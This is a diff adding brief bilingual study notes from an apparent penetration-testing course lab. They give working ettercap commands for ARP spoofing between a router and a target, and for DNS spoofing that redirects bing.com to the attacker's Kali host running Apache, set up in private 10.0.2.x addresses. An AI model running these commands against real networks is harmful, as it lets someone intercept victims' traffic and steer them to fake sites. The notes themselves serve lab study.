@@ -1,0 +1,33 @@
+progress: only finish chapter 9
+
+skip ch2~8
+
+
+
+gedit /etc/ettercap/etter.conf
+修改ettercap的設定檔,把iptables後面兩行句首的#去掉
+ec_uid=0
+ec_gid=0
+
+
+
+arp spoof
+ettercap -Tq -M arp:remote -i eth0 /<router ip>// /<target ip>//
+  ettercap -Tq -M arp:remote -i eth0 /10.0.2.1// /10.0.2.15//
+
+
+
+dns spoof
+
+gedit /etc/ettercap/etter.dns
+修改ettercap dns的設定檔
+註解掉microsoft.com那三行,並加入(10.0.2.7是kali的ip)
+bing.com     A 10.0.2.7
+*.bing.com   A 10.0.2.7
+
+啟動伺服器
+service apache2 start
+
+啟動ettercap
+ettercap -Tq -M arp:remote -i eth0 -S -P dns_spoof /<router ip>// /<target ip>//
+
